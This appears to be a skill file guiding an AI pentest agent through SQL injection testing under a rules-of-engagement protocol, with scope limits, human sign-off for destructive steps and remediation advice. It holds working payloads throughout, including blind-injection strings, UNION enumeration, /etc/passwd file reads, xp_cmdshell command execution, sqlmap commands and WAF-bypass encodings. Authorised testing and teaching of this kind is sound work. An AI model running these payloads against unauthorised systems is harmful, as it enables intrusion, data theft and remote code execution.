---
name: web-sqli
description: "SQL injection testing for a pentest-team engagement — detection (error/boolean/time-based/OOB/second-order), DB fingerprinting and schema enumeration, JSON/GraphQL/WebSocket/REST-filter vectors, WAF bypass, and DB-specific exploitation for MySQL/MSSQL/PostgreSQL/Oracle, with sqlmap/ghauri automation. Load it when the appsec-triage input-validation sweep turns up a SQLi lead on a claimed web/API target."
---

# SQL Injection — under the engagement protocol

Deep methodology for the SQLi class. You reach here from the `appsec-triage` input-validation sweep with a lead on a surface you already own on the board.

## Under the engagement protocol

- **Claimed and in-scope only.** Run these against a target you own on the board and that is on the `ROE.md` allowlist — nothing else.
- **Prove with a marker, not a dump.** Confirm the injection and prove impact against a *planted* or *single* record, or a schema read that shows access — never extract a whole table to "demonstrate". No-real-data in the ROE means the proof is a marker or a hash.
- **Read before write; destructive only with explicit go.** File writes (`INTO OUTFILE`), OS command execution (`xp_cmdshell`), and anything that mutates or drops data are destructive/outward-facing — mark the surface blocked and route through the lead to the anchor for the human's go before running them. Never run `DROP`/`DELETE`/`UPDATE` payloads to "test"; a boolean or time-based confirmation makes the point without touching data.
- **Rate-limit yourself.** Blind extraction and sqlmap can hammer a shared target and trip a WAF ban for the whole team. Throttle, and coordinate load on the board.
- **Log and file** per PROTOCOL §Evidence and §Findings — findings in the `appsec-reporting` format, with a reproduction another operator could re-run.

## Quick workflow

1. Map every input vector reaching the DB on your target (URL params, POST body, cookies, headers, API filters, GraphQL args, WebSocket messages).
2. Probe for classic SQLi; fall back to inferential (boolean/time-based) when no error surfaces.
3. Fingerprint the DB and enumerate schema — enough to prove access, not to exfiltrate.
4. Confirm impact against a marker; escalate (file read / RCE) only if in scope and cleared.
5. File the finding with a clean reproduction and remediation.

## Detection

### Probes — all input vectors
```
' " ; -- /* */ # ) ( + , \  %
' OR '1'='1        " OR "1"="1
```

### Error-based
Trigger syntax errors (`'  ''  `` "  ,  %  \`) and read the response for DB version strings, table/column names, ORM stack traces — they fingerprint the backend for free.

### Boolean-based blind
```sql
' OR 1=1 --      ' OR 1=2 --
' AND 1=1 --     ' AND 1=2 --
```
Compare response size/content between the true and false conditions.

### Time-based blind
```sql
' OR SLEEP(5) --                                  -- MySQL
' OR pg_sleep(5) --                               -- PostgreSQL
' WAITFOR DELAY '0:0:5' --                         -- MSSQL
'; BEGIN DBMS_LOCK.SLEEP(5); END; --               -- Oracle
```
Keep the delay short and the request count low on a shared target.

### Modern vectors
```sql
-- JSON operators
id=1 AND JSON_EXTRACT('{"a":1}', '$.a')=1          -- MySQL
id=1 AND '{"a":1}'::jsonb ? 'a'                    -- PostgreSQL
```
```
-- GraphQL argument pivot
{"query":"query{ users(filter: \"' OR 1=1 --\"){ id }}"}
```
```json
-- REST filter / NoSQL-ish operator injection
POST /api/users/search
{ "filter": { "name": {"$regex": "admin' OR 1=1--"} } }
```
WebSocket: send the payload inside the JSON message frame the app uses.

### Second-order
Inject where input is *stored* (registration, profile) and fires later when a different query reads it back. Plant a marker, then trigger the read path.

## Automation (throttled, in-scope)

```bash
# From a captured, in-scope request — safest with sqlmap
sqlmap -r req.txt --dbs --batch --delay 1 --threads 1

# Ghauri is often faster for time-based blind
ghauri -u "https://<in-scope>/page?id=1" --dbs

# Parameter discovery before you fuzz
hakrawler -url https://<in-scope> | tee crawl
arjun -i crawl -oJ params.json
```
Keep `--threads` low and add `--delay` on shared/production targets; never point automation at a host outside the allowlist.

## Enumeration (prove access, don't exfiltrate)

```sql
-- Column count / string columns (UNION)
' UNION SELECT NULL-- -      ' UNION SELECT NULL,NULL-- -
' UNION SELECT 'a',NULL-- -

-- Version
' UNION SELECT @@version --          -- MySQL/MSSQL
' UNION SELECT version() --          -- PostgreSQL

-- Tables / columns (schema, not data)
' UNION SELECT table_name,1 FROM information_schema.tables -- -
' UNION SELECT column_name,1 FROM information_schema.columns WHERE table_name='users' -- -
```
Reading the schema and a single marker row proves the finding. Stop there.

## Database-specific escalation (only if in scope and cleared)

These cross from "read" into file/OS access — do-no-harm applies, and they need the human's go through the anchor:

```sql
-- MySQL file read / write (write = destructive; gated)
' UNION SELECT LOAD_FILE('/etc/passwd') --
-- MSSQL OS exec (gated — RCE, route to anchor first)
'; EXEC xp_cmdshell 'whoami' --
-- PostgreSQL file read
' UNION SELECT pg_read_file('/etc/passwd',0,1000) --
```
If the ROE forbids RCE or the target is production, a documented *proof of reachability* (you demonstrated the primitive exists) beats actually popping a shell.

## WAF bypass (when a control sits in front)

Case/comment/encoding variation (`/*!50000UNION*/`, `UnIoN`, URL/double-URL/unicode encoding), whitespace alternatives (`/**/`, `%0a`, `+`), and inline comments to break signatures. Note in the finding that a WAF was present and what bypassed it — the client's control efficacy is itself reportable.

## Remediation (for the finding)

1. **Fix** — parameterized queries / prepared statements; ORM-safe query building; never string-concatenate input into SQL.
2. **Defense in depth** — least-privilege DB account (no `FILE`, no `xp_cmdshell`), input allowlisting, WAF rule.
3. **Detection** — a log/SIEM rule on the injection signature or the anomalous query shape that would have caught it.

Write it up in the `appsec-reporting` finding format, CWE-89 / A03:2021, with the marker-based reproduction.
